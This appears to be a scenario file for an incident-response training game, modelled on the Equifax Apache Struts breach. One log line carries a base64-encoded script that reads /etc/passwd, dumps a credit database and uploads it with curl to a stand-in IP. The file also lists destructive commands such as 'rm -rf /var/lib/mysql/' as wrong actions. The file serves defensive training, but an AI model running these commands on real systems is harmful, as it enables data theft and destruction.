@@ -1,0 +1,114 @@
+{
+    "id": "equifax_breach",
+    "role": "security",
+    "title": "Equifax Data Breach",
+    "basedOn": "Equifax Apache Struts Breach 2017",
+    "severity": "SEV0",
+    "storyIntro": "You are a SOC analyst. An alert indicates massive egress of unencrypted PII data. Attackers exploited an unpatched Apache Struts vulnerability to access the dispute portal and are exfiltrating credit records.",
+    "brief": "An unpatched Apache Struts vulnerability has exposed primary consumer databases. Threat actors are running bulk data queries on sensitive records.",
+    "objectives": [
+        "Identify the compromised web app",
+        "Block the exfiltration IPs",
+        "Patch the Struts vulnerability",
+        "Rotate database credentials"
+    ],
+    "systemsImpacted": [
+        "Dispute Resolution Portal",
+        "Customer Database",
+        "Egress Gateway"
+    ],
+    "initialLogs": [
+        "[CRITICAL] Anomalous outbound traffic volume",
+        "[ERROR] WAF bypass detected via Content-Type header. Exploit script payload: IyBBcGFjaGUgU3RydXRzIFJlbW90ZSBTaGVsbCBFeHBsb2l0IChDVkUtMjAxNy01NjM4KQ0Kd2hvYW1pOw0KY2F0IC9ldGMvcGFzc3dkOw0KcGdfZHVtcCAtVSByb290IGNvbnN1bWVyX2NyZWRpdF9kYXRhYmFzZSA+IC90bXAvY3JlZGl0X2R1bXAuc3FsOw0KY3VybCAtWCBQT1NUIC1GICJkYXRhPUBsdG1wL2NyZWRpdF9kdW1wLnNxbCIgaHR0cDovLzE5OC41MS4xMDAuNzIvdXBsb2FkOw==",
+        "[WARNING] Multiple SQL injections logged"
+    ],
+    "metrics": {
+        "cpu": 60,
+        "latency": 200,
+        "errorRate": 5,
+        "requestsPerSecond": 8000
+    },
+    "agents": [
+        {
+            "name": "Manager",
+            "role": "CISO",
+            "message": "Are they taking SSNs? Stop the bleeding immediately."
+        },
+        {
+            "name": "Teammate",
+            "role": "Threat Hunter",
+            "message": "I see weird OGNL expressions in the Apache logs."
+        }
+    ],
+    "timelineEvents": [
+        "Massive egress starts",
+        "Struts exploit detected",
+        "Database dumped"
+    ],
+    "possibleActions": [
+        "Block egress IPs",
+        "Take dispute portal offline",
+        "Patch Apache Struts",
+        "Rotate DB passwords"
+    ],
+    "wrongActions": [
+        "Ignore the WAF alerts",
+        "Reboot the database"
+    ],
+    "winCondition": "Exfiltration stopped and vulnerability patched.",
+    "loseCondition": "Millions of records exfiltrated.",
+    "evolving_logs": [
+        "[CRITICAL] SQL queries timing out due to high load",
+        "[ERROR] Database replication process halted unexpectedly",
+        "[WARNING] New OGNL expressions targeting Struts configuration",
+        "[ALERT] Customer credentials leaked on pastebin"
+    ],
+    "mitigation_path": [
+        "iptables -A OUTPUT -d 192.0.2.0/24 -j DROP",
+        "sudo systemctl stop httpd",
+        "patch < /tmp/struts2-patch.diff",
+        "mysql -u root -p -e 'ALTER USER 'db_admin'@'%' IDENTIFIED BY 'newPass1234';'"
+    ],
+    "incorrect_action_consequences": {
+        "rm -rf /var/lib/mysql/": "Entire customer database permanently destroyed.",
+        "iptables -F": "All firewall rules cleared, allowing free exfiltration."
+    },
+    "stakeholder_personalities": {
+        "Manager": {
+            "style": "aggressive",
+            "priority": "immediate containment",
+            "catchphrase": "Cost is no object - kill this now!"
+        },
+        "CTO": {
+            "style": "analytical",
+            "priority": "root cause analysis",
+            "catchphrase": "We need to understand what went wrong at each layer"
+        }
+    },
+    "scenario_specific_outputs": {
+        "netstat -anp | grep ESTABLISHED": "tcp 0 0 192.168.1.100:443 94.142.241.111:3306 ESTABLISHED 12345/httpd",
+        "cat /var/log/httpd/error_log | grep Struts": "[ERROR] Struts Action Not Found: /DisputePortal.action",
+        "tail -f /var/log/mysql/mysql.log": "2023-10-15T14:35:01.654321Z 12345 Query SELECT * FROM credit_records WHERE customer_id = '123456789'"
+    },
+    "intent_prerequisites": {
+        "restart": [
+            "drain",
+            "cordon",
+            "throttle",
+            "block"
+        ],
+        "rollback": [
+            "drain",
+            "cordon",
+            "throttle"
+        ],
+        "failover": [
+            "lock",
+            "throttle"
+        ],
+        "kill": [
+            "isolate",
+            "block"
+        ]
+    }
+}
